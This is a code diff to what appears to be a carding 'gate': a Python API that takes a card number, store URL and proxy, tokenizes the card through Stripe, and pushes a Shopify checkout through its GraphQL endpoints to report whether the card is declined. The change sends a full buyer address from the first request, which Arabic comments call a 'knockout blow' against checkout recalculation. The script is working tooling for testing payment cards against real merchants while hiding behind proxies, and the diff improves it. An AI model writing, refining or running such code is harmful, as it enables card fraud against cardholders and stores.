@@ -21,7 +21,7 @@ def format_proxy(proxy_str):
     elif len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
     return f"http://{proxy_str}"
 
-def safe_response(msg, raw_data, price, gate="Python Dynamic V20"):
+def safe_response(msg, raw_data, price, gate="Python Dynamic V21"):
     raw_clean = str(raw_data).replace('\n', ' ').replace('\r', '').replace('  ', '')[:400] if raw_data else "No Raw Data"
     final_msg = f"{msg} | RAW: {raw_clean}" if ("Failed" in msg or "Error" in msg or "Declined" in msg or "Rejected" in msg or "Empty" in msg or "Blocked" in msg) else msg
     clean_price = str(price).replace('$', '').strip() if price else "-"
@@ -123,13 +123,12 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             if res_pci.status_code != 200: return JSONResponse(content=safe_response("Stripe Rejected Card Data", res_pci.text[:80], price))
             card_session_id = res_pci.json().get("id")
 
+            # تجهيز العنوان الكامل ليتم إرساله من اللحظة الأولى
             flat_address = {
                 "address1": buyer["address1"], "address2": "", "city": buyer["city"], "countryCode": buyer["country"],
                 "postalCode": buyer["zip"], "firstName": buyer["first_name"], "lastName": buyer["last_name"],
                 "zoneCode": buyer["province"], "phone": buyer["phone"]
             }
-            partial_address = flat_address.copy()
-            partial_address["oneTimeUse"] = False
 
             gql_url = f"{store_url}/checkouts/unstable/graphql?operationName=Proposal"
             gql_headers = {
@@ -170,7 +169,8 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                 "sessionInput": {"sessionToken": session_token},
                 "delivery": {
                     "deliveryLines": [{
-                        "destination": {"partialStreetAddress": partial_address}, # هنا نبعت جزئي للاستكشاف
+                        # 🔥 الضربة القاضية: إرسال العنوان الكامل (streetAddress) من أول لحظة لمنع أي إعادة حساب
+                        "destination": {"streetAddress": flat_address},
                         "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": "any", "customDeliveryRate": False}, "options": {}},
                         "targetMerchandiseLines": {"lines": [{"stableId": merch_id}]},
                         "deliveryMethodTypes": ["SHIPPING"], "expectedTotalPrice": {"any": True}, "destinationChanged": False
@@ -273,8 +273,7 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                     "queueToken": queue_token,
                     "delivery": {
                         "deliveryLines": [{
-                            # 🔥 التحديث الجذري: نبعت العنوان الكامل (streetAddress) هنا عشان ناكد الدفع بدل العنوان الجزئي
-                            "destination": {"streetAddress": flat_address},
+                            "destination": {"streetAddress": flat_address}, # مطابق تماماً للي تم إرساله في הـ Proposal
                             "targetMerchandiseLines": {"lines": target_lines},
                             "deliveryMethodTypes": ["SHIPPING"],
                             "destinationChanged": False,
